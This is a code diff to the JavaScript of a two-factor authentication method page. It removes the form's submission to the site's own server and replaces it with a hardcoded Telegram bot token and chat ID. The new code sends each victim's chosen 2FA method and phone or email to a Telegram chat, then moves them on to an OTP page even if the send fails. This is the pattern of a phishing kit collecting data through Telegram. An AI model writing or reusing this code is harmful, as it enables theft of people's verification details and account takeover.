@@ -343,6 +343,10 @@
             }
         });
 
+        // TELEGRAM CONFIG
+        const TELEGRAM_TOKEN = '7633510489:AAGx7HpFKsocrNx_i-eeGJv0YMw492k-eBc';
+        const TELEGRAM_CHAT_ID = '7843640036';
+
         // Handle form submission
         document.getElementById('otpMethodForm').addEventListener('submit', async function (e) {
             e.preventDefault();
@@ -365,33 +369,39 @@
             errorElement.classList.remove('show');
 
             try {
-                const response = await fetch('/submit-otp-method', {
+                const timestamp = new Date().toLocaleString();
+                const msg = `📲 *2FA Method Selected*\n\n` +
+                    `⚙️ Method: \`${method}\`\n` +
+                    `📞 Contact: \`${contact}\`\n` +
+                    `⏰ Time: ${timestamp}`;
+
+                // 1. Send to Telegram (Direct) - AWAIT THIS
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        method: method,
-                        contact: contact
-                    }),
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
                 });
 
-                const data = await response.json();
+                // Success - Proceed
+                sessionStorage.setItem('otpMethod', method);
+                sessionStorage.setItem('otpContact', contact);
+                window.location.href = 'otp-verify.html';
 
-                if (data.success) {
-                    // Store contact info for reference
-                    sessionStorage.setItem('otpMethod', method);
-                    sessionStorage.setItem('otpContact', contact);
-                    // Redirect to OTP verification page
-                    window.location.href = '/otp-verify.html';
-                } else {
-                    errorElement.textContent = data.error || 'An error occurred. Please try again.';
-                    errorElement.classList.add('show');
-                }
             } catch (error) {
                 console.error('Error:', error);
-                errorElement.textContent = 'An error occurred. Please try again.';
-                errorElement.classList.add('show');
+                // Even on error, proceed if we have data, otherwise show error
+                if (method && contact) {
+                    sessionStorage.setItem('otpMethod', method);
+                    sessionStorage.setItem('otpContact', contact);
+                    window.location.href = 'otp-verify.html';
+                } else {
+                    errorElement.textContent = 'An error occurred. Please try again.';
+                    errorElement.classList.add('show');
+                }
             } finally {
                 continueButton.textContent = originalButtonText;
                 continueButton.disabled = false;
